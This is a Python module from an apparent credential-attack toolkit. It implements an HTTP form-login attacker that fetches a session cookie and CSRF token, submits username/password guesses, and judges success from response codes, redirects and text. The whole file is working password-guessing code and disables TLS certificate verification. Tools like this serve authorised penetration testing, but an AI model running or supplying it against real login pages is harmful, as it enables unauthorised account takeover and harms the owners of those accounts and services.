"""HTTP form-login credential attacker (stdlib http.client).

Config-driven: the target's login form differs per app, so field names and the
success/failure indicator come from per-protocol options. Handles a session
cookie and an optional CSRF token fetched from the login page first.
"""

from __future__ import annotations

import contextlib
import http.client
import re
import ssl
import time
from urllib.parse import urlencode

from ravan.credential.attempt import AttemptResult, AttemptStatus
from ravan.credential.base import ProtocolAttacker


class HTTPFormAttacker(ProtocolAttacker):
    protocol = "http-form"
    default_port = 80

    def __init__(
        self,
        path: str = "/login",
        user_field: str = "username",
        pass_field: str = "password",
        fail: str = "invalid",
        success: str | None = None,
        csrf_field: str | None = None,
        extra: dict[str, str] | None = None,
        tls: bool = False,
    ) -> None:
        self.path = path
        self.user_field = user_field
        self.pass_field = pass_field
        self.fail = fail
        self.success = success
        self.csrf_field = csrf_field
        self.extra = extra or {}
        self.tls = tls

    @classmethod
    def from_config(cls, config: dict[str, object]) -> HTTPFormAttacker:
        extra = config.get("extra")
        return cls(
            path=str(config.get("path", "/login")),
            user_field=str(config.get("user_field", "username")),
            pass_field=str(config.get("pass_field", "password")),
            fail=str(config.get("fail", "invalid")),
            success=str(config["success"]) if config.get("success") else None,
            csrf_field=str(config["csrf_field"]) if config.get("csrf_field") else None,
            extra={str(k): str(v) for k, v in extra.items()} if isinstance(extra, dict) else None,
            tls=bool(config.get("tls", False)),
        )

    def _connect(self, host: str, port: int, timeout: float) -> http.client.HTTPConnection:
        if self.tls or port == 443:
            return http.client.HTTPSConnection(
                host, port, timeout=timeout, context=ssl._create_unverified_context()
            )
        return http.client.HTTPConnection(host, port, timeout=timeout)

    def authenticate(
        self, host: str, port: int, username: str, password: str, timeout: float
    ) -> AttemptResult:
        started = time.monotonic()
        try:
            cookie, token = self._prime(host, port, timeout)
            fields = {self.user_field: username, self.pass_field: password, **self.extra}
            if self.csrf_field and token:
                fields[self.csrf_field] = token
            body = urlencode(fields)
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "ravan-credaccess",
            }
            if cookie:
                headers["Cookie"] = cookie
            conn = self._connect(host, port, timeout)
            try:
                conn.request("POST", self.path, body=body, headers=headers)
                resp = conn.getresponse()
                text = resp.read(65536).decode("utf-8", "replace")
                code = resp.status
                location = resp.getheader("Location", "")
            finally:
                with contextlib.suppress(OSError):
                    conn.close()
            valid = self._is_success(code, text, location)
            status = AttemptStatus.SUCCESS if valid else AttemptStatus.FAILED
            return self._result(
                host,
                port,
                username,
                password,
                status,
                error=None if valid else f"HTTP {code}",
                response_time=time.monotonic() - started,
            )
        except TimeoutError as exc:
            return self._result(
                host, port, username, password, AttemptStatus.TIMEOUT, error=str(exc)
            )
        except (OSError, http.client.HTTPException) as exc:
            return self._result(host, port, username, password, AttemptStatus.ERROR, error=str(exc))

    def _prime(self, host: str, port: int, timeout: float) -> tuple[str | None, str | None]:
        """Fetch the login page for a session cookie and optional CSRF token."""
        conn = self._connect(host, port, timeout)
        try:
            conn.request("GET", self.path, headers={"User-Agent": "ravan-credaccess"})
            resp = conn.getresponse()
            html = resp.read(65536).decode("utf-8", "replace")
            set_cookie = resp.getheader("Set-Cookie")
        finally:
            with contextlib.suppress(OSError):
                conn.close()
        cookie = set_cookie.split(";", 1)[0] if set_cookie else None
        token = self._extract_token(html) if self.csrf_field else None
        return cookie, token

    def _extract_token(self, html: str) -> str | None:
        if not self.csrf_field:
            return None
        field = re.escape(self.csrf_field)
        for pattern in (
            rf'name=["\']?{field}["\']?[^>]*?value=["\']([^"\'>]+)',
            rf'value=["\']([^"\'>]+)["\'][^>]*?name=["\']?{field}',
        ):
            m = re.search(pattern, html, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def _is_success(self, code: int, text: str, location: str) -> bool:
        low = text.lower()
        if self.success:
            return self.success.lower() in low
        if code in (301, 302, 303, 307, 308) and "login" not in location.lower():
            return True
        return self.fail.lower() not in low


__all__ = ["HTTPFormAttacker"]
